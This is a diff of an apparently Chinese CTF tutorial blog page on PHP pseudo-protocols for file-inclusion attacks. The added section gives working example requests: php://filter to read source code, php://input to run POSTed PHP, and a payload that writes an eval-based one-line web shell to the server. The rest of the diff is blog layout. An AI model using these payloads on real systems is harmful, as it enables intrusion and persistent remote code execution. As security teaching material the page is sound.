@@ -465,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    179
+                    665
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -512,6 +512,38 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
 <h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ol>
 <li>data://text/plain,    可以把后面的伪代码当作代码执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo?&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>data://text/plain;base64,<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   &#x2F;&#x2F;后面这一串就是base64编码后的&lt;?php phpinfo()?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>allow_url_fopen和allow_url_include为on和close都可，没有什么严格的条件</li>
+</ol>
+<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol>
+<li>访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen和allow_url_include的影响</li>
+<li>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。如果上传一个1.txt，仍然可以当作一个php文件去解析</li>
+</ol>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol>
+<li>file:// — 访问本地文件系统</li>
+<li>说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径(不以://indows 盘符开头的路径)提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。</li>
+</ol>
+<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</li>
+</ol>
+<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol>
+<li>php:// 访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input</li>
+<li>php://filter用于读取源码</li>
+<li>php://input用于执行php代码</li>
+</ol>
+<h3 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter 参数详解"></a>php://filter 参数详解</h3><ol>
+<li>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递</li>
+<li>简单点说，路径上写参数，参数加到php://filter的路径后面</li>
+</ol>
+<h3 id="示例，最常用的php-filter伪代码"><a href="#示例，最常用的php-filter伪代码" class="headerlink" title="示例，最常用的php://filter伪代码"></a>示例，最常用的php://filter伪代码</h3><ol>
+<li>php://filter/read=convert.base64-encode/resource=[文件名]//后面的可以省略<a href="%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">读取文件源码</a><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>php://input + [POST DATA]执行php代码<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA部分]
+[POST DATA]就是php代码，例如&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>如果有写入权限，则可以写入一句话木马<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -748,18 +780,17 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+                <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="php伪协议">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含漏洞">
                         
-                        <span class="card-title">php伪协议</span>
+                        <span class="card-title">文件包含漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -769,9 +800,9 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-20
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-23
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -784,7 +815,6 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1041,7 +1071,7 @@ data:&#x2F;&#x2F;text&#x2F;plain;base64<span aria-hidden="true" class="line-numb
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">68.7k</span>&nbsp;字
+                class="white-color">73.6k</span>&nbsp;字
             
             
             
